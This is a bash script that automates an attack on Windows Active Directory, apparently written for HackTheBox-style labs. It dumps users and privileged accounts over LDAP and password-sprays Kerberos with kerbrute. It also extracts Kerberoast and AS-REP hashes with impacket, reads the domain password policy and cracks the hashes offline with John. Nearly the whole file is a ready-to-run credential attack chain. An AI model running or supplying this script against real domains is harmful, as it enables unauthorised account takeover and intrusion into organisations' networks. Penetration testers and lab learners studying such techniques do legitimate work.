#!/bin/bash

user_list="/tmp/windapsearch-noauth-allusers.txt"
password_list="/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"

echo -n "Enter Domain Name i.e htb.local [ENTER]: "
read domain
echo -n "Enter Domain Controller IP Address [ENTER]: "
read ip
echo -n "Enter Username (For Authenticated Scan Optional) [ENTER]: "
read username
echo -n "Enter Password (For Authenticated Scan Optional) [ENTER]: "
read password

sudo wget https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64 -O /tmp/windapsearch
sudo chmod 777 /tmp/windapsearch
sudo rm /tmp/windapsearch-auth-allusers.txt
sudo rm /tmp/windapsearch-auth-domainadmins.txt
sudo rm /tmp/windapsearch-auth-userspns.txt
sudo rm /tmp/windapsearch-auth-privuser.txt
sudo rm /tmp/kerberos-tickets.txt
sudo rm /tmp/domain-password-policy.txt
sudo rm /tmp/windapsearch-auth-unconstrained-users.txt
sudo rm /tmp/windapsearch-auth-unconstrained-computers.txt

#Run LDAP Query WITHOUT Credentials and dump all users
/tmp/windapsearch -d $domain --dc $ip -m users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-noauth-allusers.txt

# Run Kerbrute
echo "Running Kerbrute against Kerberos"
/tmp/kerbrute passwordspray --users "$user_list" --passwords "$password_list" --domain "$domain" --dc "$ip"

#Run LDAP Query WITH Credentials and dump all users
/tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-allusers.txt

#Run LDAP Query WITH Credentials and dump Domain Admins
/tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m domain-admins | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-domainadmins.txt

#Run LDAP Query WITH Credentials and dump Kerberoastable Accounts
/tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m user-spns | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-userspns.txt

#Run LDAP Query WITH Credentials and dump Priv User Accounts
/tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m privileged-users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-privuser.txt

#Run LDAP Query WITH Credentials and dump unconstrained User Accounts
/tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m unconstrained-users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-unconstrained-users.txt

#Run LDAP Query WITH Credentials and dump unconstrained Computer Accounts
/tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m unconstrained-computers | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-unconstrained-computers.txt

#Find Kerberoastable Service Accounts and Export Hashes to Text File
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py $domain/$username:$password -dc-ip $ip -outputfile /tmp/kerberos-tickets.txt

#Find AS-REP Accounts and Export Hashes to Text File
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip $ip $domain/ -usersfile /tmp/windapsearch-auth-allusers.txt -format john -outputfile /tmp/as-rep-hashes.txt

#Obtain Password Policy From DC
crackmapexec smb $ip -u $username -p $password --pass-pol > /tmp/domain-password-policy.txt

#Use John to crack Roastable Service Accounts Offline 
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt /tmp/kerberos-tickets.txt --format=krb5tgs

#Use John to crack AS-REP Accounts Offline 
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt /tmp/as-rep-hashes.txt


